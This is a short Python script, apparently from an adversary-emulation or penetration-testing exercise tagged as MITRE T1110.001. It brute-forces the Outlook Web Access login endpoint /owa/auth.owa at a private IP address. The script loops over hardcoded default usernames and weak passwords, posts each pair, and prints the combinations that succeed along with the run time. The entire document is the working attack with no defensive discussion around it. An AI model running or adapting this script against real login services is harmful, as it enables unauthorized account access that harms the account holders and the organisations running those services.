# Brute-Force Login (T1110.001 - Password Guessing) 
# Objective: Test the /owa/auth.owa endpoint by attempting to brute-force login credentials.
import requests
import time

base_url = "http://172.20.10.7:80"
login_url = f"{base_url}/owa/auth.owa"
usernames = ["admin", "user", "test"]
passwords = ["password", "123456", "admin123"]

def brute_force_login():
    start_time = time.time()  # Start timing
    print("Starting brute-force login...")
    for username in usernames:
        for password in passwords:
            payload = {"username": username, "password": password}
            response = requests.post(login_url, data=payload)
            if response.status_code == 200 and "Login Successful" in response.text:
                print(f"[+] Login successful: {username}:{password}")
                break
            else:
                print(f"[-] Failed login: {username}:{password}")
    end_time = time.time()  # End timing 
    print(f"Brute-force login execution time: {end_time - start_time:.2f} seconds")

brute_force_login()